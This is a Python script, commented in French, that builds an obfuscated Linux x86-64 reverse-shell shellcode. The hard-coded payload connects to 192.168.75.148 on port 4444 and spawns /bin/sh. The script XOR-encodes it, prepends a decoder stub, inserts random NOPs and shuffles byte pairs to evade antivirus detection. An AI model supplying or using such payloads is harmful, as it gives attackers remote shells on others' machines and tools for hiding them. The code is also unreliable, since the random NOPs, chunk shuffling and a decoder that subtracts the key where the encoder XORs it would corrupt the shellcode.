import random

def xor_encode(shellcode, key):
    encoded_shellcode = bytearray()
    for byte in shellcode:
        encoded_shellcode.append(byte ^ key)
    return bytes(encoded_shellcode)

def add_nops(shellcode):
    nop = b'\x90'
    mutated_shellcode = bytearray()
    for byte in shellcode:
        mutated_shellcode.append(byte)
        # Ajoute aléatoirement des NOPs
        if random.choice([True, False]):
            mutated_shellcode.append(nop[0])
    return bytes(mutated_shellcode)

def permute_instructions(shellcode):
    # Découpe le shellcode en instructions (en supposant une longueur d'instruction fixe pour simplifier)
    instruction_length = 2  # Cette valeur doit être ajustée selon la longueur réelle des instructions
    instructions = [shellcode[i:i + instruction_length] for i in range(0, len(shellcode), instruction_length)]
    random.shuffle(instructions)
    return b''.join(instructions)

def format_shellcode(shellcode):
    return ''.join(f'\\x{byte:02x}' for byte in shellcode)

# Shellcode principal
original_shellcode = b"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xff\x48\x31\xf6\xb0\x29\x40\xb7\x02\x40\xb6\x01\xb2\x06\x0f\x05\x49\x89\xc0\x48\x83\xec\x08\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\xc7\x44\x24\x04\xc0\xa8\x4b\x94\x48\x89\xe6\xb2\x10\x41\x50\x5f\xb0\x2a\x0f\x05\xb0\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05\xb0\x21\x41\x50\x5f\x40\xb6\x01\x0f\x05\xb0\x21\x41\x50\x5f\x40\xb6\x02\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

# Clé d'encodage
key = 0xAA

# Encoder le shellcode
encoded_shellcode = xor_encode(original_shellcode, key)

# Décodeur en shellcode
decoder = b"\xeb\x11\x5e\x31\xc9\xb1\x19\x80\x6c\x0e\xff\xaa\x48\xff\xc6\xe2\xf7\xeb\x05\xe8\xea\xff\xff\xff"

# Ajouter le décodeur au shellcode encodé
complete_shellcode = decoder + encoded_shellcode

# Ajouter des NOPs pour l'obfuscation
mutated_shellcode = add_nops(complete_shellcode)

# Permuter les instructions pour l'obfuscation
mutated_shellcode = permute_instructions(mutated_shellcode)

# Formater le shellcode pour l'impression
formatted_shellcode = format_shellcode(mutated_shellcode)

print(formatted_shellcode)
